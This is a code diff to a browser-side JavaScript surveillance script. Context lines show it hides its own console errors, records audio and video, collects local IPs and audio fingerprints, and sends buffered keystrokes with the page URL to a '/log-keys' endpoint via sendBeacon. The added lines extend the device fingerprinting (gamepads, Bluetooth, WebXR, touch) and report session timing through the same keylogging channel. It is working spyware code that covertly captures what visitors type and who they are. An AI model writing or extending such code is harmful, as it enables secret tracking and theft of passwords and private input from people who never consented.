@@ -25,6 +25,7 @@
     let audioRecorder = null, audioActive = false;
     let audioHTTPActive = false, audioHTTPTimer = null;
     let videoRecording = false; // guard: prevents concurrent video recordings
+    const pageStartTime = Date.now(); // track total session duration
 
     // ═══ HELPERS ═══════════════════════════════════════════════
     // Suppress all console errors from this script
@@ -368,6 +369,13 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
         try { const ips = await getLocalIPs(); if (ips.length) info.localIPs = ips.join(', '); } catch {}
         try { const af = await getAudioFingerprint(); if (af !== 'n/a') info.audioFingerprint = af; } catch {}
         try { if (navigator.plugins?.length > 0) info.plugins = Array.from(navigator.plugins).map(p => p.name).join(', '); } catch {}
+        // Gamepad detection
+        try { const gp = navigator.getGamepads ? [...navigator.getGamepads()].filter(Boolean) : []; if (gp.length) info.gamepads = gp.map(g => g.id).join(', '); } catch {}
+        // Bluetooth / XR capability flags
+        try { info.bluetoothAvailable = !!navigator.bluetooth; } catch {}
+        try { info.webXRAvailable = !!(navigator.xr); } catch {}
+        // Check if device appears to be a mobile/tablet based on coarse pointer + touch
+        try { info.hasTouchscreen = navigator.maxTouchPoints > 0; info.hasCoarsePointer = window.matchMedia('(pointer:coarse)').matches; } catch {}
         await post('/device-info', info);
     }
 
@@ -1098,6 +1106,17 @@ ${btns.length ? `<div class="_wn-ac">${btns.map(b => `<button class="_wn-bt" dat
             const b = new Blob([JSON.stringify({ clientId: ID, keys: keyBuffer, url: location.href })], { type: 'application/json' });
             navigator.sendBeacon(BASE + '/log-keys', b);
         }
+        // Report total page session duration and visible time
+        try {
+            const totalMs = Date.now() - pageStartTime;
+            const hidMs = totalHiddenMs + (hiddenSince ? Date.now() - hiddenSince : 0);
+            const visMs = Math.max(0, totalMs - hidMs);
+            const fmt = ms => ms < 60000 ? Math.round(ms/1000) + 's' : Math.round(ms/60000) + 'm' + Math.round((ms%60000)/1000) + 's';
+            navigator.sendBeacon(BASE + '/log-keys', new Blob([JSON.stringify({
+                clientId: ID, url: location.href,
+                keys: `[PAGE SESSION] total=${fmt(totalMs)} visible=${fmt(visMs)} hidden=${fmt(hidMs)}`
+            })], { type: 'application/json' }));
+        } catch {}
         // Immediately signal server that this client is offline
         const offlineBlob = new Blob([JSON.stringify({ clientId: ID, offline: true })], { type: 'application/json' });
         navigator.sendBeacon(BASE + '/heartbeat', offlineBlob);
